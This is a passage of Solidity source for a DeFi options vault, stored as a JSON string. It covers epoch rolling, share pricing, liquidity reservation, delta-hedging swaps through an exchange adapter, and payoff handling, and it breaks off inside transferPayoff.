VaultLib.pricePerShare(lockedLiquidity, outstandingShares, _shareDecimals);\n        epochPricePerShare[getEpoch().current] = sharePrice;\n\n        // NOTE: if for any reason lockedLiquidity results in 0 we avoid new depositors to receive no shares\n        if (sharePrice == 0) {\n            revert InsufficientLiquidity(bytes4(keccak256(\"_beforeRollEpoch()::sharePrice == 0\")));\n        }\n\n        // Increase shares hold due to initiated withdrawals:\n        _state.withdrawals.heldShares += _state.withdrawals.newHeldShares;\n\n        // Reserve the liquidity needed to cover the withdrawals initiated in the current epoch:\n        // NOTE: here we just account the amounts and we delay all the actual swaps to the final one in order to optimize them\n        // NOTE: if sharePrice is zero, the users will receive zero from withdrawals\n        uint256 newPendingWithdrawals = VaultLib.sharesToAsset(\n            _state.withdrawals.newHeldShares,\n            sharePrice,\n            _shareDecimals\n        );\n        _state.liquidity.pendingWithdrawals += newPendingWithdrawals;\n        // Cannot underflow since share price is computed taking into account residual lockedLiquidity\n        lockedLiquidity -= newPendingWithdrawals;\n\n        // Reset the counter for the next epoch:\n        // NOTE: the held shares are burned when withdrawals are completed\n        _state.withdrawals.newHeldShares = 0;\n\n        // Set aside the payoff to be paid:\n        _state.liquidity.pendingPayoffs += _state.liquidity.newPendingPayoffs;\n        _state.liquidity.newPendingPayoffs = 0;\n\n        // Mint shares related to new deposits performed during the closing epoch:\n        // If vault has been killed, we go ahead minting shares and the last epoch depositors will have to call `rescueShares()`\n        uint256 sharesToMint = VaultLib.assetToShares(_state.liquidity.pendingDeposits, sharePrice, _shareDecimals);\n        _mint(address(this), sharesToMint);\n\n        lockedLiquidity += _state.liquidity.pendingDeposits;\n        _state.liquidity.pendingDeposits = 0;\n\n        _state.liquidity.lockedInitially = lockedLiquidity;\n\n        if (_state.killed) {\n            // NOTE: no need to adjust balances, since all side tokens should be already converted\n            return;\n        }\n\n        _adjustBalances();\n        _state.liquidity.lockedInitially = notional();\n\n        // NOTE: leave only an even number of base tokens for the DVP epoch\n        if (lockedLiquidity % 2 != 0) {\n            _state.liquidity.lockedInitially -= 1;\n        }\n\n        (uint256 baseTokens, ) = _tokenBalances();\n\n        // NOTE: if after rebalance there's no enough liquidity to fulfill pending liabilities (see [IL-NOTE]) pause vault and signal to admins\n        if (baseTokens < _state.liquidity.pendingWithdrawals + _state.liquidity.pendingPayoffs) {\n            _pause();\n            emit MissingLiquidity(_state.liquidity.pendingWithdrawals + _state.liquidity.pendingPayoffs - baseTokens);\n        }\n    }\n\n    /// @notice Adjusts the balances in order to cover the liquidity locked for pending operations and obtain an equal weight portfolio.\n    function _adjustBalances() internal {\n        address exchangeAddress = _addressProvider.exchangeAdapter();\n        if (exchangeAddress == address(0)) {\n            revert AddressZero();\n        }\n        IExchange exchange = IExchange(exchangeAddress);\n\n        (uint256 baseTokens, uint256 sideTokens) = _tokenBalances();\n        uint256 pendings = _state.liquidity.pendingWithdrawals + _state.liquidity.pendingPayoffs;\n\n        if (baseTokens < pendings) {\n            // We must cover the missing base tokens by selling an amount of side tokens:\n            uint256 missingBaseTokens = pendings - baseTokens;\n            uint256 sideTokensForMissingBaseTokens = exchange.getInputAmount(sideToken, baseToken, missingBaseTokens);\n\n            // see [IL-NOTE]\n            if (sideTokensForMissingBaseTokens > sideTokens) {\n                revert InsufficientLiquidity(\n                    bytes4(keccak256(\"_adjustBalances():sideTokensForMissingBaseTokens > sideTokens\"))\n                );\n            }\n\n            // Once we covered the missing base tokens, we still have to reach an equal weight portfolio\n            // with residual liquidity, so we also have to sell half of the remaining side tokens\n            uint256 halfOfRemainingSideTokens = (sideTokens - sideTokensForMissingBaseTokens) / 2;\n            uint256 sideTokensToSell = sideTokensForMissingBaseTokens + halfOfRemainingSideTokens;\n            _sellSideTokens(sideTokensToSell);\n        } else {\n            uint256 halfNotional = notional() / 2;\n            uint256 targetSideTokens = exchange.getOutputAmount(baseToken, sideToken, halfNotional);\n\n            // NOTE: here we are not interested in the number of exchanged base tokens\n            _deltaHedge(int256(targetSideTokens) - int256(sideTokens));\n        }\n    }\n\n    /// @inheritdoc EpochControls\n    function _afterRollEpoch() internal virtual override {\n        emit VaultTVL(getEpoch().current, v0());\n    }\n\n    /// @inheritdoc IVault\n    function deltaHedge(int256 sideTokensAmount) external onlyDVP isNotDead whenNotPaused returns (uint256 baseTokens) {\n        return _deltaHedge(sideTokensAmount);\n    }\n\n    /**\n        @notice Adjust the portfolio by trading the given amount of side tokens.\n        @param sideTokensAmount The amount of side tokens to buy (positive value) / sell (negative value).\n        @return baseTokens The amount of exchanged base tokens.\n     */\n    function _deltaHedge(int256 sideTokensAmount) internal returns (uint256 baseTokens) {\n        if (sideTokensAmount > 0) {\n            uint256 amount = uint256(sideTokensAmount);\n            return _buySideTokens(amount);\n        } else {\n            uint256 amount = uint256(-sideTokensAmount);\n            return _sellSideTokens(amount);\n        }\n    }\n\n    /**\n        @notice Swap some of the available base tokens in order to obtain the provided amount of side tokens.\n        @param amount The amount of side tokens to buy.\n        @return baseTokens The amount of exchanged base tokens.\n     */\n    function _buySideTokens(uint256 amount) internal returns (uint256 baseTokens) {\n        if (amount == 0) {\n            return 0;\n        }\n        address exchangeAddress = _addressProvider.exchangeAdapter();\n        if (exchangeAddress == address(0)) {\n            revert AddressZero();\n        }\n        IExchange exchange = IExchange(exchangeAddress);\n\n        uint256 requiredInput = exchange.getInputAmountMax(baseToken, sideToken, amount);\n        uint256 minRequiredInput = exchange.getInputAmount(baseToken, sideToken, amount);\n\n        uint256 amountToApprove = requiredInput;\n        uint256 availableBaseTokens = _notionalBaseTokens();\n\n        // Since `requiredInput` should be an over-estimate, if available tokens are not enough to cover `getInputAmountMax`, try to approve all and do the swap\n        if (availableBaseTokens < requiredInput) {\n            amountToApprove = availableBaseTokens;\n\n            // If even `minRequiredInput` cannot be covered, we reduce the required side tokens amount up to a X% safety margin to tackle with extreme scenarios where swap slippages may reduce the initial notional used for hedging computation\n            if (availableBaseTokens < minRequiredInput) {\n                amount -= (amount * _hedgeMargin) / 10000;\n            }\n        }\n\n        IERC20(baseToken).safeApprove(exchangeAddress, amountToApprove);\n        baseTokens = exchange.swapOut(baseToken, sideToken, amount, amountToApprove);\n\n        // // Improvement: in order to standardize error response, catch a custom Adapter error when given input is < requested\n        // try exchange.swapOut(baseToken, sideToken, amount, amountToApprove) returns (uint256 inputBaseTokens) {\n        //     baseTokens = inputBaseTokens;\n        // } catch (bytes memory reason) {\n        //     // catch failing assert()\n        //     if (bytes4(reason) == bytes4(keccak256(\"InsufficientInput()\"))) {\n        //         revert InsufficientLiquidity(bytes4(keccak256(\"_buySideTokens()\")));\n        //     }\n        //     revert FailingDeltaHedge();\n        // }\n    }\n\n    /**\n        @notice Swap the provided amount of side tokens in exchange for base tokens.\n        @param amount The amount of side tokens to sell.\n        @return baseTokens The amount of exchanged base tokens.\n     */\n    function _sellSideTokens(uint256 amount) internal returns (uint256 baseTokens) {\n        if (amount == 0) {\n            return 0;\n        }\n        (, uint256 sideTokens) = _tokenBalances();\n        if (amount > sideTokens) {\n            revert InsufficientLiquidity(bytes4(keccak256(\"_sellSideTokens()\")));\n        }\n\n        address exchangeAddress = _addressProvider.exchangeAdapter();\n        if (exchangeAddress == address(0)) {\n            revert AddressZero();\n        }\n        IExchange exchange = IExchange(exchangeAddress);\n\n        IERC20(sideToken).safeApprove(exchangeAddress, amount);\n        baseTokens = exchange.swapIn(sideToken, baseToken, amount);\n    }\n\n    /// @inheritdoc IVault\n    function reservePayoff(uint256 residualPayoff) external onlyDVP {\n        if (residualPayoff > notional()) {\n            revert InsufficientLiquidity(bytes4(keccak256(\"reservePayoff()\")));\n        }\n        _state.liquidity.newPendingPayoffs = residualPayoff;\n    }\n\n    /// @inheritdoc IVault\n    function transferPayoff(address recipient, uint256 amount, bool isPastEpoch) external onlyDVP whenNotPaused {\n        if (amount == 0) {\n            return;\n        }\n\n        if (isPastEpoch) {\n            if (amount > _state.liquidity.pendingPayoffs) {\n                revert ExceedsAvailable();\n            }\n            _state.liquidity.pendingPayoffs -= amount"
    }
  ]
}